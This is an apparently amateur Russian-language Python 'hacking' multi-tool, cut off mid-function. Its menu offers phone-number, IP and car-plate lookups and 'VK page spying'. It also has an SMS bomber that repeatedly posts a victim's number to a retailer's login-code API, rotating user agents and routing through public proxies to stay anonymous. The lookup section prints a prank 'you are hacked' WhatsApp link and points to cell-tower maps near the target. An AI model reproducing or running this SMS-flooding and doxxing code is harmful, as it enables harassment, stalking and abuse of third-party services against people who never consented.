#!/usr/bin/python3
def qu():
    quit()
try:
    from colorama import Fore, Style
except ImportError:
    print('У вас не установлен colorama, для его установки введите в консоли pip3 install colorama')
    qu()
try:
    import urllib.request
except ImportError:
    print('У вас не установлен urllib.request, для его установки введите в консоли pip3 install urllib3')
    qu()
try:
    import requests
except ImportError:
    print('У вас не установлен requests, для его установки введите в консоли pip3 install requests')
    qu()
import os, sys, random, json, datetime
def cl():
    if os.sys.platform == "win32":
        os.system("cls")
    else:
        os.system("clear")
from time import sleep
banners = ['''
____________¶¶¶
___________¶___¶
____________¶¶¶
____________¶_¶
____________¶_¶
__________¶¶¶_¶¶¶
________¶¶__¶¶¶__¶¶¶
______¶¶__¶¶¶¶¶¶¶___¶
_____¶_______________¶
____¶_________________¶
____¶_________________¶
____¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
____¶____¶_______________¶
____¶____¶___¶¶¶¶¶¶¶¶¶¶¶¶¶
____¶___¶___¶___________¶¶¶
____¶___¶___¶_¶¶¶___¶¶¶__¶¶
____¶___¶___¶_¶¶¶___¶¶¶__¶¶
____¶___¶___¶___________¶¶¶
____¶____¶___¶¶¶¶¶¶¶¶¶¶¶¶¶
____¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶
____¶_________________¶
____¶____¶¶¶¶¶¶¶¶¶¶¶¶¶¶
____¶___¶__¶__¶__¶__¶
____¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶
____¶__¶___¶__¶__¶__¶
____¶___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
___¶¶¶_________________¶¶¶
█▀ █▀█ █▀ ▄█ █▀ █▄▀ ▄▀█ ▄▄ █░█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█ █▀
▄█ █▄█ ▄█ ░█ ▄█ █░█ █▀█ ░░ █▀█ █▀█ █▄▄ █░█ ██▄ █▀▄ ▄█
''', 
'''
_________$$$___$$$
______ __$$$___$$$
_____$$$$$$$$$$$$$$$
___$$$ $$$$$$$$$$$$$$$$
__$$$$$_$$$___$$$__$$$$
_$$$$$__$$$___$$$
_$$$$$__$$$___$$$
_ $$$$$__$$$___$$$
___$$$$$$$$$$$$$$$$$$$
_____$$$$$ $$$$$$$$$$$$$$
________ $$$___$$$___$$$$$
________$$$___$$$____$$$$$
________$$$ ___$$$____$$$$$
_$$$$__ _$$$___$$$___$$$$$
__$$$$$$$$$$$$$$$$$$$$$$
____$$$$$$$$ $$$$$$$$$$
________$$$_ __$$$
________$$$__ _$$$
█▀ █▀█ █▀ ▄█ █▀ █▄▀ ▄▀█ ▄▄ █░█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█ █▀
▄█ █▄█ ▄█ ░█ ▄█ █░█ █▀█ ░░ █▀█ █▀█ █▄▄ █░█ ██▄ █▀▄ ▄█
''', 
'''
  ██████  ▒█████    ██████   ██▓ ██ ▄█▀  ██████  ▄▄▄       ██░ ██  ▄▄▄       ▄████▄  ██ ▄█▀ ▓█████ ██▀███    ██████ 
▒██    ▒ ▒██▒  ██▒▒██    ▒ ▒▓██▒ ██▄█▒ ▒██    ▒ ▒████▄   ▒▓██░ ██ ▒████▄    ▒██▀ ▀█  ██▄█▒  ▓█   ▀▓██ ▒ ██▒▒██    ▒ 
░ ▓██▄   ▒██░  ██▒░ ▓██▄   ▒▒██▒▓███▄░ ░ ▓██▄   ▒██  ▀█▄ ░▒██▀▀██ ▒██  ▀█▄  ▒▓█    ▄▓███▄░  ▒███  ▓██ ░▄█ ▒░ ▓██▄   
  ▒   ██▒▒██   ██░  ▒   ██▒░░██░▓██ █▄   ▒   ██▒░██▄▄▄▄██ ░▓█ ░██ ░██▄▄▄▄██▒▒▓▓▄ ▄██▓██ █▄  ▒▓█  ▄▒██▀▀█▄    ▒   ██▒
▒██████▒▒░ ████▓▒░▒██████▒▒░░██░▒██▒ █▄▒██████▒▒▒▓█   ▓██ ░▓█▒░██▓▒▓█   ▓██░▒ ▓███▀ ▒██▒ █▄▒░▒████░██▓ ▒██▒▒██████▒▒
▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ░▓  ▒ ▒▒ ▓▒▒ ▒▓▒ ▒ ░░▒▒   ▓▒█  ▒ ░░▒░▒░▒▒   ▓▒█░░ ░▒ ▒  ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░
░ ░▒  ░    ░ ▒ ▒░ ░ ░▒  ░ ░░ ▒ ░░ ░▒ ▒░░ ░▒  ░ ░░ ░   ▒▒   ▒ ░▒░ ░░ ░   ▒▒    ░  ▒  ░ ░▒ ▒░░ ░ ░    ░▒ ░ ▒ ░ ░▒  ░ ░
░  ░  ░  ░ ░ ░ ▒  ░  ░  ░  ░ ▒ ░░ ░░ ░ ░  ░  ░    ░   ▒    ░  ░░ ░  ░   ▒   ░       ░ ░░ ░     ░    ░░   ░ ░  ░  ░  
      ░      ░ ░        ░    ░  ░  ░         ░        ░    ░  ░  ░      ░   ░ ░     ░  ░   ░   ░     ░           ░  
''', 
'''
░░░░░░░  ░░░░░░  ░░░░░░░ ░░ ░░   ░░ ░░░░░░░  ░░░░░  ░░   ░░  ░░░░░   ░░░░░░ ░░   ░░ ░░░░░░░ ░░░░░░  ░░░░░░░ 
▒▒      ▒▒    ▒▒ ▒▒      ▒▒ ▒▒  ▒▒  ▒▒      ▒▒   ▒▒ ▒▒   ▒▒ ▒▒   ▒▒ ▒▒      ▒▒  ▒▒  ▒▒      ▒▒   ▒▒ ▒▒      
▒▒▒▒▒▒▒ ▒▒    ▒▒ ▒▒▒▒▒▒▒ ▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒▒ ▒▒▒▒▒▒▒ ▒▒▒▒▒▒▒ ▒▒▒▒▒▒▒ ▒▒      ▒▒▒▒▒   ▒▒▒▒▒   ▒▒▒▒▒▒  ▒▒▒▒▒▒▒ 
     ▓▓ ▓▓    ▓▓      ▓▓ ▓▓ ▓▓  ▓▓       ▓▓ ▓▓   ▓▓ ▓▓   ▓▓ ▓▓   ▓▓ ▓▓      ▓▓  ▓▓  ▓▓      ▓▓   ▓▓      ▓▓ 
███████  ██████  ███████ ██ ██   ██ ███████ ██   ██ ██   ██ ██   ██  ██████ ██   ██ ███████ ██   ██ ███████ 
''',
'''
             .-"""-.
            /       \
            \       /
     .-"""-.-`.-.-.<  _
    /      _,-\ O_O-_/ ) 
    \     / ,  `   . `|
     '-..-| \-.,__~ ~ /        
           \ `-.__/  /         
          / `-.__.-\`-._    ,",
         / /|    ___\-._`-.;  , .----.  
        ( ( |.-"`   `'\ '-(     -.---' 
         \ \/    {}{}  |   \.__.-'
          \|           /     
           \        , /
           ( __`;-;'__`)
           `//'`   `||`
          _//       ||
  .-"-._,(__)     .(__).-""-.
 /          \    /           \
 \          /    \           /
  `'-------`      `--------'`
█▀ █▀█ █▀ ▄█ █▀ █▄▀ ▄▀█ ▄▄ █░█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█ █▀
▄█ █▄█ ▄█ ░█ ▄█ █░█ █▀█ ░░ █▀█ █▀█ █▄▄ █░█ ██▄ █▀▄ ▄█
''']
def ban_num():
    print(Fore.RED + '''
╔═══╗──────╔╗───╔╗───────╔╗─╔╗─────╔╗─────────────────────╔╗
║╔═╗║─────╔╝║───║║───────║║─║║─────║║─────────────────────║║
║╚══╦══╦══╬╗║╔══╣║╔╦══╗──║╚═╝╠══╦══╣║╔╦══╦═╦══╗──╔═╗╔╗╔╦╗╔╣╚═╦══╦═╗
╚══╗║╔╗║══╣║║║══╣╚╝╣╔╗╠══╣╔═╗║╔╗║╔═╣╚╝╣║═╣╔╣══╬══╣╔╗╣║║║╚╝║╔╗║║═╣╔╝
║╚═╝║╚╝╠══╠╝╚╬══║╔╗╣╔╗╠══╣║─║║╔╗║╚═╣╔╗╣║═╣║╠══╠══╣║║║╚╝║║║║╚╝║║═╣║
╚═══╩══╩══╩══╩══╩╝╚╩╝╚╝──╚╝─╚╩╝╚╩══╩╝╚╩══╩╝╚══╝──╚╝╚╩══╩╩╩╩══╩══╩╝
Version >>> 3.0''' + Style.RESET_ALL)
def ban_num_car():
    print(Fore.RED + '''
╔═══╗──────╔╗───╔╗───────╔╗─╔╗─────╔╗
║╔═╗║─────╔╝║───║║───────║║─║║─────║║
║╚══╦══╦══╬╗║╔══╣║╔╦══╗──║╚═╝╠══╦══╣║╔╦══╦═╦══╗──╔═╗╔╗╔╦╗╔╗──╔══╦══╦═╗
╚══╗║╔╗║══╣║║║══╣╚╝╣╔╗╠══╣╔═╗║╔╗║╔═╣╚╝╣║═╣╔╣══╬══╣╔╗╣║║║╚╝╠══╣╔═╣╔╗║╔╝
║╚═╝║╚╝╠══╠╝╚╬══║╔╗╣╔╗╠══╣║─║║╔╗║╚═╣╔╗╣║═╣║╠══╠══╣║║║╚╝║║║╠══╣╚═╣╔╗║║
╚═══╩══╩══╩══╩══╩╝╚╩╝╚╝──╚╝─╚╩╝╚╩══╩╝╚╩══╩╝╚══╝──╚╝╚╩══╩╩╩╝──╚══╩╝╚╩╝
Version >>> 3.0''' + Style.RESET_ALL)
def ban_ip():
    print(Fore.RED + '''
╔═══╗──────╔╗───╔╗───────╔╗─╔╗─────╔╗───────────╔══╦═══╗
║╔═╗║─────╔╝║───║║───────║║─║║─────║║───────────╚╣╠╣╔═╗║
║╚══╦══╦══╬╗║╔══╣║╔╦══╗──║╚═╝╠══╦══╣║╔╦══╦═╦══╗──║║║╚═╝║
╚══╗║╔╗║══╣║║║══╣╚╝╣╔╗╠══╣╔═╗║╔╗║╔═╣╚╝╣║═╣╔╣══╬══╣║║╔══╝
║╚═╝║╚╝╠══╠╝╚╬══║╔╗╣╔╗╠══╣║─║║╔╗║╚═╣╔╗╣║═╣║╠══╠═╦╣╠╣║
╚═══╩══╩══╩══╩══╩╝╚╩╝╚╝──╚╝─╚╩╝╚╩══╩╝╚╩══╩╝╚══╝─╚══╩╝
Version >>> 3.0''' + Style.RESET_ALL)
def ban_nick():
    print(Fore.RED + '''
╔═══╗──────╔╗───╔╗───────╔╗─╔╗─────╔╗───────────────────╔╗
║╔═╗║─────╔╝║───║║───────║║─║║─────║║───────────────────║║
║╚══╦══╦══╬╗║╔══╣║╔╦══╗──║╚═╝╠══╦══╣║╔╦══╦═╦══╗──╔═╗╔╦══╣║╔╗
╚══╗║╔╗║══╣║║║══╣╚╝╣╔╗╠══╣╔═╗║╔╗║╔═╣╚╝╣║═╣╔╣══╬══╣╔╗╬╣╔═╣╚╝╝
║╚═╝║╚╝╠══╠╝╚╬══║╔╗╣╔╗╠══╣║─║║╔╗║╚═╣╔╗╣║═╣║╠══╠══╣║║║║╚═╣╔╗╗
╚═══╩══╩══╩══╩══╩╝╚╩╝╚╝──╚╝─╚╩╝╚╩══╩╝╚╩══╩╝╚══╝──╚╝╚╩╩══╩╝╚╝
Version >>> 3.0''' + Style.RESET_ALL)
def ban_spy_vk():
    print(Fore.RED + '''
╔═══╗──────╔╗───╔╗───────╔╗─╔╗─────╔╗────────────╔═══╗────────╔╗──╔╦╗╔═╗
║╔═╗║─────╔╝║───║║───────║║─║║─────║║────────────║╔═╗║────────║╚╗╔╝║║║╔╝
║╚══╦══╦══╬╗║╔══╣║╔╦══╗──║╚═╝╠══╦══╣║╔╦══╦═╦══╗──║╚══╦══╦╗─╔╗─╚╗║║╔╣╚╝╝
╚══╗║╔╗║══╣║║║══╣╚╝╣╔╗╠══╣╔═╗║╔╗║╔═╣╚╝╣║═╣╔╣══╬══╬══╗║╔╗║║─║╠══╣╚╝║║╔╗║
║╚═╝║╚╝╠══╠╝╚╬══║╔╗╣╔╗╠══╣║─║║╔╗║╚═╣╔╗╣║═╣║╠══╠══╣╚═╝║╚╝║╚═╝╠══╩╗╔╝║║║╚╗
╚═══╩══╩══╩══╩══╩╝╚╩╝╚╝──╚╝─╚╩╝╚╩══╩╝╚╩══╩╝╚══╝──╚═══╣╔═╩═╗╔╝───╚╝─╚╝╚═╝
─────────────────────────────────────────────────────║║─╔═╝║
─────────────────────────────────────────────────────╚╝─╚══╝
Version >>> 3.0''' + Style.RESET_ALL)
def continuation_RU():
    print('''
          .-------------------------------------------.
          |            Выберите функцию               |
          | _________________________________________ |
          |                                           |
          | break_num - Поиск номера по сети          |
          | break_ip - Пробив IP-адреса               |
          | break_num_car - Поиск номера авто по сети |
          | search_nick - Поиск ника по сети          |
          | sms_bomber - Смс-Бомбер                   |
          | spy_vk - Слежка за ВК страницей           |
          | 0 - Выключить код                         |
          '-------------------------------------------'
    ''')
cl()
print(f"S"),sleep(0.5),print(f" O"),sleep(0.5),print(f"  S"),sleep(0.5),print(f"   1"),sleep(0.5),print(f"    S"),sleep(0.5),print(f"     K"),sleep(0.5),print(f"      A"),sleep(2)
try:
    cl()
    sleep(1)
    print(f'Привет, с моего кода можно сменить IP-адрес через Proxy-Сервер, чтобы посмотреть информацию и остаться анонимным в сети.'
    ' Это нужно чтобы никакой Системный-Администратор не смотрел что ты делаешь через интренет, также чтобы у тебя не было постоянной капчи'
    f' Т.к. в моём коде будут постоянные запросы в интернете\n')
    print('Надо?', Fore.GREEN + 'y' + Style.RESET_ALL, '/', Fore.RED + 'n' + Style.RESET_ALL)
    change_ip = input(Fore.GREEN + '>>> ' + Style.RESET_ALL)
    if str(change_ip) == "y":
        def change_ip_session():
            session = requests.session()
            session.proxies = {'http': 'http://5.252.161.48:8080',
                            'http': 'http://5.252.161.48:3128',
                            'http': 'http://5.252.161.48:8080',
                            'http': 'http://161.35.70.249:3128',
                            'http': 'http://18.132.249.194:80'}
            return session
        session = change_ip_session()
        print(session.get("http://httpbin.org/ip").text)
        sleep(5)
    while True:
        try:
            cl()
            print(random.choice(banners))
            continuation_RU()
            print('Наши', Fore.BLUE + 'Вконтакте' + Style.RESET_ALL, 'ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
            f'\t\t\thttps://vk.com/2pac_jdm\n'
            f'\t\t\thttps://vk.com/paket\n'
            f'\t\t\thttps://vk.com/covidone' + Style.RESET_ALL)
            print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com\n' + Style.RESET_ALL)
            print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
            f'\t\t\thttps://github.com/Ki11sesh\n'
            f'\t\t\thttps://github.com/Cool-Hackers\n' + Style.RESET_ALL)
            cont_input = input(Fore.GREEN + '/Sos/>>> ' + Style.RESET_ALL)
            if str(cont_input) == "break_num":
                cl()
                ban_num()
                print('Наши', Fore.BLUE + 'Вконтакте' + Style.RESET_ALL, 'ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
                f'\t\t\thttps://vk.com/2pac_jdm\n'
                f'\t\t\thttps://vk.com/paket\n'
                f'\t\t\thttps://vk.com/covidone' + Style.RESET_ALL)
                print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com\n' + Style.RESET_ALL)
                print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
                f'\t\t\thttps://github.com/Ki11sesh\n'
                f'\t\t\thttps://github.com/Cool-Hackers\n' + Style.RESET_ALL)
                print(Fore.YELLOW + 'Введите номер' + Style.RESET_ALL, Fore.CYAN + '+79515200611' + Style.RESET_ALL)
                number_input = input(Fore.GREEN + 'Sos/break_num/>>> ' + Style.RESET_ALL)

                getInfo = f'https://htmlweb.ru/geo/api.php?json&telcod={str(number_input)}'
                try:
                    infoNumber = urllib.request.urlopen( getInfo )
                except:
                    print('[!] - Номер введён неверно - [!]')
                    sleep(5)
                    qu()
                infoNumber = json.load( infoNumber )
                try:
                    print(f"Страна >>> ", infoNumber["country"]["fullname"])
                except KeyError:
                    print(f"Cтрана >>> Не удалось определить")
                try:
                    print(f"Столица >>> ", infoNumber["capital"]["name"])
                except KeyError:
                    print(f"Столица >>> Не удалось определить")
                try:
                    print(f"Широта столицы >>> ", infoNumber["capital"]["latitude"])
                except KeyError:
                    print(f"Широта столицы >>> Не удалось определить")
                try:
                    print(f"Долгота столицы >>> ", infoNumber["capital"]["longitude"])
                except KeyError:
                        print(f"Долгота столицы >>> Не удалось определить")
                try:
                    print(f"Тип времени >>> +", infoNumber["capital"]["time_zone"])
                except KeyError:
                    print(f"Тип времени >>> Не удалось определить")
                try:
                    print(f"Код номера >>> ", infoNumber["country"]["country_code3"])
                except KeyError:
                    print(f"Код номера >>> Не удалось опеределить")
                try:
                    print(f"MCC номера >>> ", infoNumber["country"]["mcc"])
                except KeyError:
                    print(f"MCC номера >>> Не удалось оперделить")
                try:
                    print(f"Регион >>> ", infoNumber["region"]["name"])
                except KeyError:
                    print(f"Регион >>> Не удалось определить")
                try:
                    print(f"Округ >>> ", infoNumber["region"]["okrug"])
                except KeyError:
                    print(f"Округ >>> Не удалось определить")
                try:
                    print(f"Код региона >>> ", infoNumber["region"]["autocod"])
                except KeyError:
                    print(f"Код региона >>> Не удалось определить")
                try:
                    print(f"Город >>> ", infoNumber["0"]["name"])
                except KeyError:
                    print(f"Город >>> Не удалось определить")
                try:
                    print(f"Широта города >>> ", infoNumber["0"]["latitude"])
                except KeyError:
                    print(f"Широта города >>> Не удалось определить")
                try:
                    print(f"Долгота города >>> ", infoNumber["0"]["longitude"])
                except KeyError:
                    print(f"Долгота города >>> Не удалось определить")
                try:
                    print(f"Oper_id >>> ", infoNumber["0"]["oper_id"])
                except KeyError:
                    print(f"Oper_id >>> Не удалось определить")
                try:
                    print(f"Радиус номеров телефонов >>> ", infoNumber["0"]["def"])
                except KeyError:
                    print(f"Радиус номеров телефоно >>> Не удалось определить")
                try:
                    print(f"Рабочесть телефона >>> ", infoNumber["0"]["mobile"])
                except KeyError:
                    print(f"Рабочесть телефона >>> Не удалось определить")
                try:
                    print(f"Оператор >>> ", infoNumber["0"]["oper"])
                except KeyError:
                    print(f"Оператор >>> Не удалось определить")
                print("Если по всем пораметрам стоит надпись [Не удалось определить] проверьте номер на правильность")
                print(f"Проверьте эти ссылки: ")
                print(f"https://api.whatsapp.com/send?phone={str(number_input)}&text=You,%20are&20hacked%20by%20by%20the%20Cool-Hackers - Поиск номера в", Fore.GREEN + "WhatsApp" + Style.RESET_ALL) 
                print(f"https://facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar - Поиск номера в", Fore.BLUE + "Facebook" + Style.RESET_ALL)
                print(f"https://linkedin.com/checkpoint/rp/request-password-reset-submit - Поиск номера в Linkedin")
                print(f"https://viber://add?number={str(number_input)} - Поиск номера в", Fore.MAGENTA + "Viber" + Style.RESET_ALL)
                print(f"tel:{str(number_input)} - Простой звонок")
                print(f"Вставьте эту ссылку в браузер с поисковой системой Yandex: ")
                print(f"site:vk.com {str(number_input)} - Поиск номера по сайту", Fore.BLUE + "VK" + Style.RESET_ALL)
                print(f"site:ok.ru {str(number_input)} - Поиск номера по сайту", Fore.YELLOW + "OK" + Style.RESET_ALL)
                print(f"site:instagram.com {str(number_input)} - Поиск номера по сайту Instagram")
                print(f"Предоставить ли вам доступ к сотовым вышкам?")
                print(f"Вам надо запомнить широту и долготу города!")
                print(f"y/n")
                cell_tower_input = input(Fore.GREEN + '>>> ' + Style.RESET_ALL)
                if str(cell_tower_input) == "y":
                    cl()
                    ban_num()
                    latitude_tower_input = input(Fore.YELLOW + "Введите широту: " + Style.RESET_ALL)
                    longitude_tower_input = input(Fore.YELLOW + "Введите долготу: " + Style.RESET_ALL)
                    
                    print(Fore.YELLOW + f"Вставьте данную ссылку в любой браузер:\n" + Style.RESET_ALL)
                    print(f"https://opencellid.org/#zoom=13&lat={str(latitude_tower_input)}&lon={str(longitude_tower_input)}")
                    print()
                    print("Продолжить?")
                    print("y/n")
                    cont_input_2 = input(Fore.GREEN + "Sos/break_num/cell_tower/>>> " + Style.RESET_ALL)
                    if str(cont_input_2) == "n":
                        cl()
                        print('Наши', Fore.BLUE + 'Вконтакте' + Style.RESET_ALL, 'ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
                        f'\t\t\thttps://vk.com/2pac_jdm\n'
                        f'\t\t\thttps://vk.com/paket\n'
                        f'\t\t\thttps://vk.com/covidone' + Style.RESET_ALL)
                        print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com\n' + Style.RESET_ALL)
                        print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
                        f'\t\t\thttps://github.com/Ki11sesh\n'
                        f'\t\t\thttps://github.com/Cool-Hackers\n' + Style.RESET_ALL)
                        print()
                        print("Создатель кода", Fore.GREEN + "--->" + Style.RESET_ALL, Fore.BLUE + "https://vk.com/nikitasos1ska, https://github.com/Sos1ska" + Style.RESET_ALL)
                        sleep(5)
                        qu()
            if str(cont_input) == "break_ip":
                cl()
                ban_ip()
                print('Наши', Fore.BLUE + 'Вконтакте' + Style.RESET_ALL, 'ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
                f'\t\t\thttps://vk.com/2pac_jdm\n'
                f'\t\t\thttps://vk.com/paket\n'
                f'\t\t\thttps://vk.com/covidone' + Style.RESET_ALL)
                print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com\n' + Style.RESET_ALL)
                print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
                f'\t\t\thttps://github.com/Ki11sesh\n'
                f'\t\t\thttps://github.com/Cool-Hackers\n' + Style.RESET_ALL)
                print(Fore.YELLOW + 'Введите IP-адрес' + Style.RESET_ALL)
                ip_input = input(Fore.GREEN + '/Sos/break_ip/>>> ' + Style.RESET_ALL)

                getINfo = f'https://ipinfo.io/{str(ip_input)}/json'
                try:
                    infoIp = urllib.request.urlopen( getINfo )
                except:
                    print('[!] - IP-адрес введён не верно - [!]')
                    sleep(5)
                    qu()
                infoIp = json.load( infoIp )
                try:
                    print('Страна >>> ', infoIp["country"])
                except KeyError:
                    print('Страна >>> Определить не удалось')
                try:
                    print('Город >>> ', infoIp["city"])
                except KeyError:
                    print('Город >>> Определить не удалось')
                try:
                    print('Широта и долгота города >>> ', infoIp["loc"])
                except KeyError:
                    print('Широта и долгота города >>> Определить не удалось')
                try:
                    print('Название сети >>> ', infoIp["hostname"])
                except KeyError:
                    print('Название сети >>> Определить не удалось')
                try:
                    print('Провайдер >>> ', infoIp["org"])
                except KeyError:
                    print('Провайдер >>> Определить не удалось')
                print()
                print('Для получения подробной информации о IP-адресе, перейдите по ссылке:')
                print('https://2ip.ru/geoip/')
                print()
                print(Fore.YELLOW + 'Для получение больше информации, перейдите по ссылке ниже:' + Style.RESET_ALL)
                print('https://2ip.ru/geoip/')
                print()
                print(Fore.YELLOW + 'Продолжить?' + Style.RESET_ALL)
                print('y/n')
                cont_input_3 = input(Fore.GREEN + '/Sos/break_ip/>>> ' + Style.RESET_ALL)
                if str (cont_input_3) == "n":
                    cl()
                    print('Наши', Fore.BLUE + 'Вконтакте' + Style.RESET_ALL, 'ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
                    f'\t\t\thttps://vk.com/2pac_jdm\n'
                    f'\t\t\thttps://vk.com/paket\n'
                    f'\t\t\thttps://vk.com/covidone' + Style.RESET_ALL)
                    print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com\n' + Style.RESET_ALL)
                    print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
                    f'\t\t\thttps://github.com/Ki11sesh\n'
                    f'\t\t\thttps://github.com/Cool-Hackers\n' + Style.RESET_ALL)
                    print()
                    print("Создатель кода", Fore.GREEN + "--->" + Style.RESET_ALL, Fore.BLUE + "https://vk.com/nikitasos1ska, https://github.com/Sos1ska" + Style.RESET_ALL)
                    sleep(5)
                    qu()
            if str(cont_input) == "break_num_car":
                cl()
                ban_num_car()
                print('Наши', Fore.BLUE + 'Вконтакте' + Style.RESET_ALL, 'ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
                f'\t\t\thttps://vk.com/2pac_jdm\n'
                f'\t\t\thttps://vk.com/paket\n'
                f'\t\t\thttps://vk.com/covidone' + Style.RESET_ALL)
                print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com\n' + Style.RESET_ALL)
                print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
                f'\t\t\thttps://github.com/Ki11sesh\n'
                f'\t\t\thttps://github.com/Cool-Hackers\n' + Style.RESET_ALL)
                print(Fore.YELLOW + 'Введите номер авто' + Style.RESET_ALL)
                num_car_input = input(Fore.GREEN + '/Sos/break_num_car/>>> ' + Style.RESET_ALL)
                print('Проверьте эти ссылки')
                print(f"\t https://авто-история.рф/num/{str(num_car_input)}/")
                print(f"\t https://www.230km.ru/{str(num_car_input)}.nomer")
                print(f"\t http://avto-nomer.ru/ru/gallery.php?fastsearch={str(num_car_input)}")
                print(Fore.YELLOW + 'Продолжить?' + Style.RESET_ALL)
                print('y/n')
                cont_input_4 = input(Fore.GREEN + '/Sos/break_num_car/>>> ' + Style.RESET_ALL)
                if str(cont_input_4) == "n":
                    cl()
                    print('Наши', Fore.BLUE + 'Вконтакте' + Style.RESET_ALL, 'ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
                    f'\t\t\thttps://vk.com/2pac_jdm\n'
                    f'\t\t\thttps://vk.com/paket\n'
                    f'\t\t\thttps://vk.com/covidone' + Style.RESET_ALL)
                    print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com\n' + Style.RESET_ALL)
                    print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
                    f'\t\t\thttps://github.com/Ki11sesh\n'
                    f'\t\t\thttps://github.com/Cool-Hackers\n' + Style.RESET_ALL)
                    print()
                    print("Создатель кода", Fore.GREEN + "--->" + Style.RESET_ALL, Fore.BLUE + "https://vk.com/nikitasos1ska, https://github.com/Sos1ska" + Style.RESET_ALL)
                    sleep(5)
                    qu()
            if str(cont_input) == "sms_bomber":
                cl()
                import time
                print(Fore.YELLOW + 'Введите номер телефона. Пример:' + Style.RESET_ALL, Fore.CYAN + '+79021100147' + Style.RESET_ALL)
                input_number = input(Fore.GREEN + ">>> " + Style.RESET_ALL)
                print(Fore.YELLOW + 'Кол-во смс?' + Style.RESET_ALL)
                sms = int(input(Fore.GREEN + ">>> " + Style.RESET_ALL))
                def parse_number(number):
                    msg = f"[*]Проверка номера - Номер правильный!"
                    if len(number) in (10, 11, 12):
                        if number[0] == "8":
                            number = number[1:]
                            print(msg)
                        elif number[:2] == "+7":
                            number = number[2:]
                            print(msg)
                        elif int(len(number)) == 10 and number[0] == 9:
                            print(msg)
                    else:
                        print(f"[*]Проверка номера - Номер введён не правильно, проверьте номер телефона")
                        time.sleep(5)
                        quit()
                    return number
                number = parse_number(input_number)
                attack(number, sms)

                heads = [
                    {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
                        'Accept': '*/*'
                    },
                    {
                    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
                    'Accept': '*/*'
                    },
                    {
                    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
                    'Accept': '*/*'
                    },
                    {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
                    'Accept': '*/*'
                    },
                    {
                    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
                    'Accept': '*/*'
                    },
                ]
                        
                        
                def check(sent, sms):
                    if sent == sms:
                        quit()
                

                def time(sent):
                    a = datetime.datetime.now()
                    time = (str(a.hour) + ':' + str(a.minute) + ':' +str(a.second))
                    msg1 = f"SMS отправлено!"
                    msg2 = f"{str(time)}"
                    if int(sent) < 10:
                        print(f"{msg1}         {msg2}")
                    elif int(sent) < 100:
                        print(f"{msg1}        {msg2}")
                    elif int(sent) < 1000:
                        print(f"{msg1}       {msg2}")
                    elif int(sent) < 10000:
                        print(f"{msg1}      {msg2}")
                    else:
                        print(f"{msg1}     {msg2}")
                        

                def attack(number, sms):
                    number_7 = str(7) + number
                    number_plus7 = str(+7) + number
                    number_8 = str(8) + number
                    sent = 0
                    print("-" * 33)
                    print(f"|    Кол-во    |      Время      |")
                    print("-" * 33)
                    HEADERS = random.choice(heads)
                    while sent <= sms:
                        try:
                            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
